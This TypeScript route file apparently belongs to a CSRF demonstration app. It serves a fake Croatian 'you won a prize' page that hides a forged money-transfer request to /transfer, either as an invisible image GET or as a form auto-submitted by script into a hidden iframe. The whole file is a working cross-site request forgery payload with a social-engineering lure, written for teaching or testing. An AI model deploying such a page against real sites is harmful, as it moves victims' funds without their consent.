// attackers page used in CSRF attack

import type { Route } from "./+types/attacker";

// GET which returns plain html of simple page with hidden CSRF attack
export function loader({ request }: Route.LoaderArgs) {
  const q = new URL(request.url).searchParams;
  const variant = q.get("variant") === "get" ? "get" : "post";
  const to = /^[a-z0-9_]{1,20}$/.test(q.get("to") ?? "") ? q.get("to")! : "kruno";
  const amount = /^\d{1,6}$/.test(q.get("amount") ?? "") ? q.get("amount")! : "100";

  // hidden element - img for get, form that auto-submits for post
  const forged =
    variant === "get"
      ? `<img src="/transfer?to=${to}&amount=${amount}" width="0" height="0" style="display:none" alt="">`
      : `<form id="f" method="POST" action="/transfer" target="sink">
           <input type="hidden" name="to" value="${to}">
           <input type="hidden" name="amount" value="${amount}">
         </form>
         <iframe name="sink" style="display:none"></iframe>
         <script>document.getElementById("f").submit();</script>`;

  const html = `<!doctype html>
<html lang="hr"><head><meta charset="utf-8">
<style>body{font-family:system-ui,sans-serif;text-align:center;padding:1rem;background:#5e1919;color:#fff7ed}</style>
</head><body>
<h2>Čestitamo! Osvojili ste nagradu</h2>
<p>Vaša nagrada se učitava…</p>
${forged}
</body></html>`;

  return new Response(html, {
    headers: { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" },
  });
}
